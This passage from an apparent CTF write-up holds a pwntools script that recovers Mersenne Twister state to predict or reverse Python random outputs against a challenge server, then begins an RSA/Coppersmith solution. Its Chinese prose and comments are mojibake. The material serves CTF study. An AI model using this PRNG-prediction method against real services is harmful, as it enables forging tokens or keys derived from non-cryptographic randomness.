class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> randcrack <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><br><br><span class="hljs-comment"># right shift inverse</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_right</span>(<span class="hljs-params">res, shift</span>):<br>    tmp = res<br>    bits = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>(res)[<span class="hljs-number">2</span>:])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits // shift):<br>        tmp = res ^ tmp &gt;&gt; shift<br>    <span class="hljs-keyword">return</span> tmp<br><br><br><span class="hljs-comment"># right shift with mask inverse</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_right_values</span>(<span class="hljs-params">res, shift, mask</span>):<br>    tmp = res<br>    bits = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>(res)[<span class="hljs-number">2</span>:])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits // shift):<br>        tmp = res ^ tmp &gt;&gt; shift &amp; mask<br>    <span class="hljs-keyword">return</span> tmp<br><br><br><span class="hljs-comment"># left shift inverse</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_left</span>(<span class="hljs-params">res, shift</span>):<br>    tmp = res<br>    bits = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>(res)[<span class="hljs-number">2</span>:])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits // shift):<br>        tmp = res ^ tmp &lt;&lt; shift<br>    <span class="hljs-keyword">return</span> tmp<br><br><br><span class="hljs-comment"># left shift with mask inverse</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_left_values</span>(<span class="hljs-params">res, shift, mask</span>):<br>    tmp = res<br>    bits = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>(res)[<span class="hljs-number">2</span>:])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits // shift):<br>        tmp = res ^ tmp &lt;&lt; shift &amp; mask<br>    <span class="hljs-keyword">return</span> tmp<br><br><span class="hljs-comment">#extract_recover</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_recover</span>(<span class="hljs-params">y</span>):<br>    y = inverse_right(y, <span class="hljs-number">18</span>)<br>    y = inverse_left_values(y, <span class="hljs-number">15</span>, <span class="hljs-number">4022730752</span>)<br>    y = inverse_left_values(y, <span class="hljs-number">7</span>, <span class="hljs-number">2636928640</span>)<br>    y = inverse_right(y, <span class="hljs-number">11</span>)<br>    <span class="hljs-keyword">return</span> y<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backtrace</span>(<span class="hljs-params">cur</span>):<br>    high = <span class="hljs-number">0x80000000</span><br>    low = <span class="hljs-number">0x7fffffff</span><br>    mask = <span class="hljs-number">0x9908b0df</span><br>    state = cur<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>        tmp = state[i + <span class="hljs-number">624</span>] ^ state[i + <span class="hljs-number">397</span>]<br>        <span class="hljs-comment"># recover Y,tmp = Y</span><br>        <span class="hljs-keyword">if</span> tmp &amp; high == high:<br>            tmp ^= mask<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>            tmp |= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>        <span class="hljs-comment"># recover highest bit</span><br>        res = tmp &amp; high<br>        <span class="hljs-comment"># recover other 31 bits,when i =0,it just use the method again it so beautiful!!!!</span><br>        tmp = state[i - <span class="hljs-number">1</span> + <span class="hljs-number">624</span>] ^ state[i + <span class="hljs-number">396</span>]<br>        <span class="hljs-comment"># recover Y,tmp = Y</span><br>        <span class="hljs-keyword">if</span> tmp &amp; high == high:<br>            tmp ^= mask<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>            tmp |= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>        res |= (tmp) &amp; low<br>        state[i] = res<br>    <span class="hljs-keyword">return</span> state<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recover_state</span>(<span class="hljs-params">out</span>):<br>    state = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> out:<br>        i = inverse_right(i, <span class="hljs-number">18</span>)<br>        i = inverse_left_values(i, <span class="hljs-number">15</span>, <span class="hljs-number">4022730752</span>)<br>        i = inverse_left_values(i, <span class="hljs-number">7</span>, <span class="hljs-number">2636928640</span>)<br>        i = inverse_right(i, <span class="hljs-number">11</span>)<br>        state.append(i)<br>    <span class="hljs-keyword">return</span> state<br><span class="hljs-comment">#é€†å‘</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_int32</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(<span class="hljs-number">0xFFFFFFFF</span> &amp; x)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init</span>(<span class="hljs-params">seed</span>):<br>    mt = [<span class="hljs-number">0</span>] * <span class="hljs-number">624</span><br>    mt[<span class="hljs-number">0</span>] = seed<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">624</span>):<br>        mt[i] = _int32(<span class="hljs-number">1812433253</span> * (mt[i - <span class="hljs-number">1</span>] ^ mt[i - <span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">30</span>) + i)<br>    <span class="hljs-keyword">return</span> mt<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">invert_right</span>(<span class="hljs-params">res, shift</span>):<br>    tmp = res<br>    bits = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>(res)[<span class="hljs-number">2</span>:])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits // shift):<br>        res = tmp ^ res &gt;&gt; shift<br>    <span class="hljs-keyword">return</span> _int32(res)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recover</span>(<span class="hljs-params">last</span>):<br>    n = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">32</span><br>    inv = invert(<span class="hljs-number">1812433253</span>, n)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">623</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>        last = ((last - i) * inv) % n<br>        last = invert_right(last, <span class="hljs-number">30</span>)<br>    <span class="hljs-keyword">return</span> last<br><span class="hljs-comment">#é€†å‘twist</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">guess_1</span>(<span class="hljs-params">randoms</span>):  <span class="hljs-comment"># é¢„æµ‹</span><br>    rc = RandCrack()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> randoms:<br>        temp = i<br>        <span class="hljs-keyword">while</span> temp != <span class="hljs-number">0</span>:<br>            rc.submit(temp % <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, <span class="hljs-number">32</span>))<br>            temp &gt;&gt;= <span class="hljs-number">32</span><br>    number = rc.predict_getrandbits(<span class="hljs-number">96</span>)<br>    <span class="hljs-keyword">return</span> number<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">guess_2</span>(<span class="hljs-params">randoms</span>):<br>    partS = recover_state(randoms)<br>    state = backtrace([<span class="hljs-number">0</span>] * <span class="hljs-number">4</span> + partS)[:<span class="hljs-number">624</span>]<br>    prng = Random()<br>    prng.setstate((<span class="hljs-number">3</span>, <span class="hljs-built_in">tuple</span>(state + [<span class="hljs-number">0</span>]), <span class="hljs-literal">None</span>))<br>    nn = prng.getrandbits(<span class="hljs-number">32</span>)<br>    number = prng.getrandbits(<span class="hljs-number">96</span>)<br>    <span class="hljs-keyword">return</span> number<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">guess_3</span>(<span class="hljs-params">last_number</span>):<br>    seed = recover(last_number)<br>    <span class="hljs-keyword">return</span> seed<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">guess_4</span>(<span class="hljs-params">ex_number</span>):<br>    <span class="hljs-keyword">return</span> extract_recover(ex_number)<br><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&#x27;node.yuzhian.com.cn&#x27;</span>,<span class="hljs-number">30279</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>io.send(<span class="hljs-string">&#x27;1&#x27;</span>)  <span class="hljs-comment">#æŒ‰ä»»æ„é”®å¼€å§‹ï¼Ÿ</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>    io.recvuntil(<span class="hljs-string">&quot;Round: &quot;</span> + <span class="hljs-built_in">str</span>(i + <span class="hljs-number">1</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>    Line = io.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].decode()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;randoms = &#x27;</span> <span class="hljs-keyword">in</span> Line:<br>        randoms = <span class="hljs-built_in">eval</span>(Line[<span class="hljs-number">9</span>:].replace(<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>))  <span class="hljs-comment">#å»é™¤L</span><br>        io.recvuntil(<span class="hljs-string">&#x27;Guess &#x27;</span>)<br>        tag = io.recvuntil(<span class="hljs-string">&#x27; number:&#x27;</span>).decode()<br>        <span class="hljs-built_in">print</span>(tag)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;after&#x27;</span> <span class="hljs-keyword">in</span> tag:<br>            io.sendline(<span class="hljs-built_in">str</span>(guess_1(randoms)))<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;pre&#x27;</span> <span class="hljs-keyword">in</span> tag:<br>            io.sendline(<span class="hljs-built_in">str</span>(guess_2(randoms)))<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;last number = &#x27;</span> <span class="hljs-keyword">in</span> Line:<br>        last_number = <span class="hljs-built_in">int</span>(Line[<span class="hljs-number">14</span>:])<br>        io.recvuntil(<span class="hljs-string">&#x27;Guess seed number:&#x27;</span>)<br>        io.sendline(<span class="hljs-built_in">str</span>(guess_3(last_number)))<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;extract number = &#x27;</span> <span class="hljs-keyword">in</span> Line:<br>        ex_number = <span class="hljs-built_in">int</span>(Line[<span class="hljs-number">17</span>:])<br>        io.recvuntil(<span class="hljs-string">&#x27;Guess be extracted number:&#x27;</span>)<br>        io.sendline(<span class="hljs-built_in">str</span>(guess_4(ex_number)))<br>io.recvall()<br></code></pre></td></tr></table></figure><h2 id="easyrsa">easyrsa</h2><p>è€ƒç‚¹ï¼š</p><ol><li>æ•°è®ºæ¨å¯¼</li><li>coppersmithæ”»å‡»</li></ol><p>ç¬¬ä¸€é—®ï¼š<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mi>p</mi><mo>âˆ—</mo><mi>q</mi><mo>âˆ—</mo><mi>s</mi><mo>âˆ—</mo><mi>t</mi></mrow><annotation encoding="application/x-tex">n=p*q*s*t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6597em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6597em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4653em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span></span></span></span>ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mi>h</mi><mi>i</mi><mo>=</mo><mo stretchy="false">(</mo><mi>p</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo><mo>âˆ—</mo><mo stretchy="false">(</mo><mi>q</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo><mo>âˆ—</mo><mo stretchy="false">(</mo><mi>s</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo><mo>âˆ—</mo><mo stretchy="false">(</mo><mi>t</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">phi=(p-1)*(q-1)*(s-1)*(t-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">hi</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></p><p>é¦–å…ˆå¯ä»¥æ±‚å‡º<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo>=</mo><msup><mi>e</mi><mrow><mo>âˆ’</mo><mn>1</mn></mrow></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi><mi>h</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">d=e^{-1}\mod{phi}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">hi</span></span></span></span>ï¼Œè€Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo>=</mo><msup><mi>m</mi><mi>e</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi><mo>âˆ—</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">c=m^e\mod{p*q}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></p><p>ç”±æ¬§æ‹‰å®šç†æœ‰ï¼š<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>c</mi><mi>d</mi></msup><mo>=</mo><mi>m</mi><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi><mo>âˆ—</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">c^d=m\mod{p*q}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></p><p>å³ï¼š<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>c</mi><mi>d</mi></msup><mo>âˆ’</mo><mi>x</mi><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi><mo>âˆ—</mo><mi>q</mi><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">f(x)=c^d-x\mod{p*q}\mod{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9324em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span>ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>è¾ƒå°ã€‚</p><p>åˆ©ç”¨coppersmithæ”»å‡»æ±‚å‡ºxã€‚</p><p>ç¬¬äºŒé—®åŒbabyrsaã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>n = <span class="hljs-number">8836130216343708623415307573630337110573363595188748983290313549413242332143945452914800845282478216810685733227137911630239808895196748125078747600505626165666334675100147790578546682128517668100858766784733351894480181877144793496927464058323582165412552970999921215333509253052644024478417393146000490808639363681195799826541558906527985336104761974023394438549055804234997654701266967731137282297623426318212701157416397999108259257077847307874122736921265599854976855949680133804464839768470200425669609996841568545945133611190979810786943246285103031363790663362165522662820344917056587244701635831061853354597</span><br>phi = <span class="hljs-number">8836130216343708623415307573630337110573363595188748983290313549413242332143945452914800845282478216810685733227137911630239808895196748125078747600505622503351461565956106005118029537938273153581675065762015952483687057805462728186901563990429998916382820576211887477098611684072561849314986341226981300596338314989867731725668312057134075244816223120038573374383949718714549930261073576391501671722900294331289082826058292599838631513746370889828026039555245672195833927609280773258978856664434349221972568651378808050580665443131001632395175205804045958846124475183825589672204752895252723130454951830966138888560</span><br>c1 = <span 